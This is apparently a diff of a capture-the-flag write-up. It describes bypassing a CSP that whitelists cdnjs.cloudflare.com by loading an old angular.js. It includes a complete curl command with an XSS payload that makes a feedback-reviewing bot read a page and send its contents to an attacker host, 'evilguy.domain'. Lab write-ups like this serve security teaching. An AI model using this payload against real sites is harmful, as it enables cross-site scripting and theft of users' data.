@@ -12,9 +12,9 @@ We are given source code of a website, where we can leave feedback. Feedback is 
 
 So, we have to make this feedback checking bot to visit this page and send the flag back to us. Feedback itself isn't sanitized, but the target page is protected by CSP. Luckily, it's configuration is vulnerable due to whitelisted `cdnjs.cloudflare.com` domain. It allows us to include vulnerable script that we can use to bypass CSP. One of those scripts is old `angular.js`, which allows us to basically inject any JS and it will be executed as a part of whitelisted script:
 
-```sh
+````sh
 curl "http://task.domain/api/submit" -d "feedback=<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.1.3/angular.min.js'></script><div ng-app ng-csp>{{\$eval.constructor('a=new XMLHttpRequest();a.open(\"GET\", \"/alien\", false);a.send(null);document.location.href=\"https://evilguy.domain/?flag=\".concat(btoa(a.responseText.match(/{.*}/g)))')()}}</div>"
-```
+````
 
 After a bit, bot kindly sends us the flag.
 
